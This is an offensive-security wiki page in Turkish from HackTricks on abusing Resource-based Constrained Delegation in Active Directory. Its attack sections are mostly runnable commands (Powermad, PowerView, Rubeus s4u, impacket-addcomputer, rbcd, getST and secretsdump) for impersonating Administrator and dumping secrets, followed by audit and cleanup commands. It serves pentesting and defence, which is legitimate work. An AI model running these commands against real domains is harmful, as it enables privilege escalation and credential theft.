# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Resource-based Constrained Delegation Temelleri

Bu, temel [Constrained Delegation](constrained-delegation.md) ile benzerdir ancak **bir nesneye** **bir makineye karşı herhangi bir kullanıcıyı taklit etme** izni vermek yerine, Resource-based Constrained Delegation **nesnede** **ona karşı herhangi bir kullanıcıyı taklit edebilecek olanı** **belirler**.

Bu durumda, kısıtlı nesne, ona karşı herhangi bir diğer kullanıcıyı taklit edebilecek kullanıcının adıyla birlikte _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ adlı bir niteliğe sahip olacaktır.

Bu Kısıtlı Delegasyonun diğer delegasyonlardan önemli bir farkı, **makine hesabı üzerinde yazma izinlerine sahip** herhangi bir kullanıcının (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) **_msDS-AllowedToActOnBehalfOfOtherIdentity_** değerini ayarlayabilmesidir (Diğer Delegasyon türlerinde alan adı yöneticisi ayrıcalıkları gerekiyordu).

### Yeni Kavramlar

Kısıtlı Delegasyon'da, kullanıcının _userAccountControl_ değerindeki **`TrustedToAuthForDelegation`** bayrağının **S4U2Self** gerçekleştirmek için gerekli olduğu söylenmişti. Ancak bu tamamen doğru değil.\
Gerçek şu ki, o değer olmadan bile, eğer bir **hizmet** (bir SPN'e sahipseniz) iseniz, herhangi bir kullanıcıya karşı **S4U2Self** gerçekleştirebilirsiniz, ancak eğer **`TrustedToAuthForDelegation`** varsa, dönen TGS **Forwardable** olacaktır ve eğer o bayrağa sahip değilseniz, dönen TGS **Forwardable** **olmayacaktır**.

Ancak, **S4U2Proxy**'de kullanılan **TGS** **Forwardable DEĞİLSE**, temel bir **Constrain Delegation**'ı kötüye kullanmaya çalışmak **çalışmayacaktır**. Ama eğer bir **Resource-Based constrain delegation**'ı istismar etmeye çalışıyorsanız, bu **çalışacaktır**.

### Saldırı Yapısı

> Eğer bir **Bilgisayar** hesabı üzerinde **yazma eşdeğer ayrıcalıklarına** sahipseniz, o makinede **ayrılmış erişim** elde edebilirsiniz.

Saldırganın zaten **kurban bilgisayarı üzerinde yazma eşdeğer ayrıcalıklarına** sahip olduğunu varsayalım.

1. Saldırgan, bir **SPN**'ye sahip bir hesabı **ele geçirir** veya **oluşturur** (“Hizmet A”). Herhangi bir _Admin User_'ın başka bir özel ayrıcalığı olmadan **10 Bilgisayar nesnesi** (**_MachineAccountQuota_**) oluşturabileceğini ve bunlara bir **SPN** ayarlayabileceğini unutmayın. Bu nedenle, saldırgan sadece bir Bilgisayar nesnesi oluşturup bir SPN ayarlayabilir.
2. Saldırgan, kurban bilgisayar (ServiceB) üzerindeki **yazma ayrıcalığını** kötüye kullanarak, **HizmetA'nın o kurban bilgisayar (ServiceB) üzerinde herhangi bir kullanıcıyı taklit etmesine izin verecek şekilde kaynak tabanlı kısıtlı delegasyonu** yapılandırır.
3. Saldırgan, **Hizmet B'ye ayrıcalıklı erişimi olan bir kullanıcı** için Hizmet A'dan Hizmet B'ye **tam bir S4U saldırısı** (S4U2Self ve S4U2Proxy) gerçekleştirmek için Rubeus'u kullanır.
   1. S4U2Self (ele geçirilen/oluşturulan SPN'den): **Yönetici için bana bir TGS iste** (Forwardable DEĞİL).
   2. S4U2Proxy: Önceki adımın **Forwardable DEĞİL** TGS'sini kullanarak **Yönetici**'den **kurban ana bilgisayara** bir **TGS** istemek.
   3. Forwardable DEĞİL bir TGS kullanıyor olsanız bile, Resource-based constrained delegation'ı istismar ettiğiniz için bu **çalışacaktır**.
   4. Saldırgan, **ticket'ı geçirebilir** ve **kullanıcıyı taklit ederek** **kurban ServiceB'ye erişim** elde edebilir.

Alan adının _**MachineAccountQuota**_ değerini kontrol etmek için şunu kullanabilirsiniz:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Saldırı

### Bir Bilgisayar Nesnesi Oluşturma

**[powermad](https://github.com/Kevin-Robertson/Powermad)** kullanarak alan içinde bir bilgisayar nesnesi oluşturabilirsiniz:
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Resource-based Constrained Delegation'ı Yapılandırma

**activedirectory PowerShell modülünü kullanarak**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Powerview Kullanımı**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Tam bir S4U saldırısı gerçekleştirme (Windows/Rubeus)

Öncelikle, `123456` şifresi ile yeni bir Bilgisayar nesnesi oluşturduk, bu yüzden o şifrenin hash'ine ihtiyacımız var:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Bu, o hesap için RC4 ve AES hash'lerini yazdıracaktır.\
Şimdi, saldırı gerçekleştirilebilir:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Rubeus'un `/altservice` parametresini kullanarak sadece bir kez sorarak daha fazla hizmet için daha fazla bilet oluşturabilirsiniz:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Kullanıcıların "**Delege edilemez**" adında bir özelliği olduğunu unutmayın. Eğer bir kullanıcının bu özelliği True ise, onu taklit edemezsiniz. Bu özellik bloodhound içinde görülebilir.

### Linux araçları: Impacket ile uçtan uca RBCD (2024+)

Eğer Linux'tan çalışıyorsanız, resmi Impacket araçlarını kullanarak tam RBCD zincirini gerçekleştirebilirsiniz:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notlar
- LDAP imzalama/LDAPS zorunluysa, `impacket-rbcd -use-ldaps ...` kullanın.
- AES anahtarlarını tercih edin; birçok modern alan RC4'ü kısıtlar. Impacket ve Rubeus her ikisi de yalnızca AES akışlarını destekler.
- Impacket bazı araçlar için `sname` ("AnySPN") değerini yeniden yazabilir, ancak mümkün olduğunda doğru SPN'yi elde edin (örneğin, CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### Erişim

Son komut satırı **tam S4U saldırısını gerçekleştirecek ve TGS'yi** Yönetici'den kurban makinesine **belleğe** enjekte edecektir.\
Bu örnekte, Yönetici'den **CIFS** hizmeti için bir TGS talep edilmiştir, bu nedenle **C$**'ye erişebileceksiniz:
```bash
ls \\victim.domain.local\C$
```
### Farklı hizmet biletlerini kötüye kullanma

[**mevcut hizmet biletleri hakkında burada bilgi edinin**](silver-ticket.md#available-services).

## Sayım, denetim ve temizlik

### RBCD yapılandırılmış bilgisayarları sayma

PowerShell (SID'leri çözmek için SD'yi çözme):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (bir komutla oku veya temizle):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Cleanup / reset RBCD

- PowerShell (özniteliği temizle):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos Hataları

- **`KDC_ERR_ETYPE_NOTSUPP`**: Bu, kerberos'un DES veya RC4 kullanmayacak şekilde yapılandırıldığı ve yalnızca RC4 hash'i sağladığınız anlamına gelir. Rubeus'a en az AES256 hash'ini (veya sadece rc4, aes128 ve aes256 hash'lerini sağlayın) verin. Örnek: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: Bu, mevcut bilgisayarın zamanının DC'nin zamanından farklı olduğu ve kerberos'un düzgün çalışmadığı anlamına gelir.
- **`preauth_failed`**: Bu, verilen kullanıcı adı + hash'lerin giriş yapmak için çalışmadığı anlamına gelir. Hash'leri oluştururken kullanıcı adının içine "$" koymayı unutmuş olabilirsiniz (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Bu, şunları ifade edebilir:
  - Taklit etmeye çalıştığınız kullanıcı, istenen hizmete erişemiyor (çünkü onu taklit edemezsiniz veya yeterli ayrıcalıklara sahip değildir)
  - İstenen hizmet mevcut değil (eğer winrm için bir bilet isterseniz ama winrm çalışmıyorsa)
  - Oluşturulan fakecomputer, savunmasız sunucu üzerindeki ayrıcalıklarını kaybetti ve bunları geri vermeniz gerekiyor.
  - Klasik KCD'yi kötüye kullanıyorsunuz; RBCD'nin, S4U2Self biletleri ile çalıştığını, KCD'nin ise iletilebilir biletler gerektirdiğini unutmayın.

## Notlar, iletimler ve alternatifler

- LDAP filtrelenmişse, RBCD SD'yi AD Web Services (ADWS) üzerinden de yazabilirsiniz. Bakınız:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos iletim zincirleri genellikle yerel SYSTEM'e ulaşmak için RBCD ile sona erer. Pratik uçtan uca örneklere bakınız:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Referanslar

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (resmi): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Hızlı Linux kılavuzu ile güncel sözdizimi: https://tldrbins.github.io/rbcd/


{{#include ../../banners/hacktricks-training.md}}
